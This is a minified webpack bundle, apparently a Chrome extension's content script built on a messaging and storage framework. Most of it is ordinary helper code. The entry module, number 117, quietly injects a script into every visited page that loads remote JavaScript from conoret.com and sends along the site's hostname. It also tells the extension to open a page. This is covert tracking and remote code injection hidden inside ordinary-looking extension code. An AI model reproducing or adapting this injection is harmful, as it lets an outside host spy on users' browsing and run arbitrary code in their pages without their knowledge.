!function(t){var e={};function r(n){if(e[n])return e[n].exports;var o=e[n]={i:n,l:!1,exports:{}};return t[n].call(o.exports,o,o.exports,r),o.l=!0,o.exports}r.m=t,r.c=e,r.d=function(t,e,n){r.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:n})},r.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},r.t=function(t,e){if(1&e&&(t=r(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var o in t)r.d(n,o,function(e){return t[e]}.bind(null,o));return n},r.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return r.d(e,"a",e),e},r.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},r.p="",r(r.s=117)}({0:function(t,e,r){"use strict";var n=r(6),o=r(7),c=r(58);function i(t,e,r){return(i="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function(t,e,r){var n=c(t,e);if(n){var o=Object.getOwnPropertyDescriptor(n,e);return o.get?o.get.call(r):o.value}})(t,e,r||t)}var u=r(17),s=r(18),a=r(12),f=function(){function t(){Object(n.a)(this,t),this.listeners=[]}return Object(o.a)(t,[{key:"addListener",value:function(t){-1===this.listeners.indexOf(t)&&this.listeners.push(t)}},{key:"dispatch",value:function(){for(var t=arguments.length,e=new Array(t),r=0;r<t;r++)e[r]=arguments[r];this.listeners.forEach((function(t){t.apply(void 0,e)}))}},{key:"hasListener",value:function(t){return-1!==this.listeners.indexOf(t)}},{key:"hasListeners",value:function(){return this.listeners.length>0}},{key:"removeListener",value:function(t){var e=this.listeners.indexOf(t);-1!==e&&this.listeners.splice(e,1)}}]),t}(),l=r(11),p=Object(l.a)("mono"),h=function(){function t(){Object(n.a)(this,t),this.onDestroy=new f,this._lastErrorFired=!1,this._lastError=null}return Object(o.a)(t,[{key:"lastError",get:function(){return this._lastErrorFired=!0,this._lastError},set:function(t){this._lastErrorFired=!t,this._lastError=t}},{key:"clearLastError",value:function(){this._lastError&&!this._lastErrorFired&&p.error("Unhandled mono.lastError error:",this.lastError),this._lastError=null}},{key:"unimplemented",value:function(){throw new Error("Unimplemented")}},{key:"destroy",value:function(){this.onDestroy.dispatch()}}]),t}();function y(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}var d=r(63);function v(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}var b=function(t){return function(t){Object(u.a)(r,t);var e=v(r);function r(){return Object(n.a)(this,r),e.apply(this,arguments)}return r}(t)};function m(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}function O(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}var g=function(t){Object(u.a)(r,t);var e=O(r);function r(){return Object(n.a)(this,r),e.apply(this,arguments)}return Object(o.a)(r,[{key:"initMessages",value:function(){this.sendMessage=this.transport.sendMessage.bind(this.transport),this.onMessage={addListener:this.transport.addListener.bind(this.transport),hasListener:this.transport.hasListener.bind(this.transport),hasListeners:this.transport.hasListeners.bind(this.transport),removeListener:this.transport.removeListener.bind(this.transport)}}}]),r}(function(t){return function(t){Object(u.a)(r,t);var e=m(r);function r(){return Object(n.a)(this,r),e.apply(this,arguments)}return r}(b(t))}(function(t){return function(t){Object(u.a)(r,t);var e=y(r);function r(){return Object(n.a)(this,r),e.apply(this,arguments)}return Object(o.a)(r,[{key:"callFn",value:function(t,e){return this.waitPromise({action:"callFn",fn:t,args:e})}},{key:"waitPromise",value:function(t){var e=this;return new Promise((function(r,n){e.sendMessage(t,(function(t){if(t){if(t.err){var o=d(t.err);return n(o)}return r(t.result)}var c=e.lastError||new Error("Unexpected response");return n(c)}))}))}}]),r}(t)}(h))),j=function(){function t(e){Object(n.a)(this,t),this.mono=e,this.onChanged={addListener:function(t){chrome.storage.onChanged.addListener(t)},hasListener:function(t){return chrome.storage.onChanged.hasListener(t)},hasListeners:function(){return chrome.storage.onChanged.hasListeners()},removeListener:function(t){chrome.storage.onChanged.removeListener(t)}}}return Object(o.a)(t,[{key:"callback",value:function(t,e,r){this.mono.lastError=chrome.runtime.lastError,(r||t)&&t(e),this.mono.clearLastError()}},{key:"get",value:function(t,e){var r=this;chrome.storage.local.get(t,(function(t){return r.callback(e,t,!0)}))}},{key:"set",value:function(t,e){var r=this;chrome.storage.local.set(t,(function(){return r.callback(e)}))}},{key:"remove",value:function(t,e){var r=this;chrome.storage.local.remove(t,(function(){return r.callback(e)}))}},{key:"clear",value:function(t){var e=this;chrome.storage.local.clear((function(){return e.callback(t)}))}}]),t}();function x(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}var _=function(t){return function(t){Object(u.a)(r,t);var e=x(r);function r(){var t;return Object(n.a)(this,r),(t=e.call(this)).isChrome=!0,t}return Object(o.a)(r,[{key:"isChromeMobile",get:function(){return/Mobile Safari\/(\d+)|Android (\d+)/.test(navigator.userAgent)}},{key:"isOperaNext",get:function(){return/OPR\/(\d+)/.test(navigator.userAgent)}}]),r}(t)};function R(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}function M(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var r,n=Object(a.a)(t);if(e){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(s.a)(this,r)}}var L=new(function(t){Object(u.a)(r,t);var e=M(r);function r(){var t;return Object(n.a)(this,r),(t=e.call(this)).initMessages(),t.initStorage(),t.initI18n(),t}return Object(o.a)(r,[{key:"initI18n",value:function(){this.i18n={getMessage:chrome.i18n.getMessage.bind(chrome.i18n)}}},{key:"initMessages",value:function(){var t=this;this.transport={sendMessage:function(e,r){r?chrome.runtime.sendMessage(e,(function(e){t.lastError=chrome.runtime.lastError,r(e),t.clearLastError()})):chrome.runtime.sendMessage(e)},addListener:function(t){chrome.runtime.onMessage.addListener(t)},hasListener:function(t){return chrome.runtime.onMessage.hasListener(t)},hasListeners:function(){return chrome.runtime.onMessage.hasListeners()},removeListener:function(t){chrome.runtime.onMessage.removeListener(t)}},i(Object(a.a)(r.prototype),"initMessages",this).call(this)}},{key:"initStorage",value:function(){this.storage=new j(this)}}]),r}(function(t){return function(t){Object(u.a)(r,t);var e=R(r);function r(){return Object(n.a)(this,r),e.apply(this,arguments)}return r}(_(t))}(g)));e.a=L},11:function(t,e,r){"use strict";e.a=function(t){var e=null;return(e=function(){}).t=e.log=e.info=e.warn=e.error=e.debug=e,e}},117:function(t,e,r){"use strict";r.r(e);var n=r(0),o=r(20);Object(o.a)("tab",(function(){var t=document.querySelector("body"),e=document.createElement("script");e.type="text/javascript",e.innerHTML='window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();',t.prepend(e),n.a.sendMessage({action:"openPage"})}))},12:function(t,e,r){"use strict";function n(t){return(n=Object.setPrototypeOf?Object.getPrototypeOf:function(t){return t.__proto__||Object.getPrototypeOf(t)})(t)}r.d(e,"a",(function(){return n}))},17:function(t,e,r){"use strict";r.d(e,"a",(function(){return o}));var n=r(48);function o(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,writable:!0,configurable:!0}}),e&&n(t,e)}},18:function(t,e,r){"use strict";r.d(e,"a",(function(){return c}));var n=r(59),o=r(60);function c(t,e){return!e||"object"!==n(e)&&"function"!=typeof e?o(t):e}},20:function(t,e,r){"use strict";r.d(e,"b",(function(){return i}));var n=r(0),o=[],c=function(t,e,r){return Promise.resolve().then((function(){return!r||r()})).then((function(r){r&&(-1===o.indexOf(t)&&o.push(t),e())}))},i=function(t,e,r){return c(t,(function(){return n.a.callFn("getPreferences").then((function(r){e(t,{preferences:r})}))}),r)};e.a=c},48:function(t,e){function r(e,n){return t.exports=r=Object.setPrototypeOf||function(t,e){return t.__proto__=e,t},t.exports.default=t.exports,t.exports.__esModule=!0,r(e,n)}t.exports=r,t.exports.default=t.exports,t.exports.__esModule=!0},57:function(t,e){function r(e){return t.exports=r=Object.setPrototypeOf?Object.getPrototypeOf:function(t){return t.__proto__||Object.getPrototypeOf(t)},t.exports.default=t.exports,t.exports.__esModule=!0,r(e)}t.exports=r,t.exports.default=t.exports,t.exports.__esModule=!0},58:function(t,e,r){var n=r(57);t.exports=function(t,e){for(;!Object.prototype.hasOwnProperty.call(t,e)&&null!==(t=n(t)););return t},t.exports.default=t.exports,t.exports.__esModule=!0},59:function(t,e){function r(e){return"function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?(t.exports=r=function(t){return typeof t},t.exports.default=t.exports,t.exports.__esModule=!0):(t.exports=r=function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},t.exports.default=t.exports,t.exports.__esModule=!0),r(e)}t.exports=r,t.exports.default=t.exports,t.exports.__esModule=!0},6:function(t,e,r){"use strict";function n(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}r.d(e,"a",(function(){return n}))},60:function(t,e){t.exports=function(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t},t.exports.default=t.exports,t.exports.__esModule=!0},63:function(t,e,r){var n=r(70).default;t.exports=n},7:function(t,e,r){"use strict";function n(t,e){for(var r=0;r<e.length;r++){var n=e[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(t,n.key,n)}}function o(t,e,r){return e&&n(t.prototype,e),r&&n(t,r),t}r.d(e,"a",(function(){return o}))},70:function(t,e,r){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol?"symbol":typeof t};function o(t){return t&&"object"===(void 0===t?"undefined":n(t))&&"string"==typeof t.name&&"string"==typeof t.message}e.default=function(t){return o(t)?Object.assign(new Error,{stack:void 0},t):t},e.isSerializedError=o}});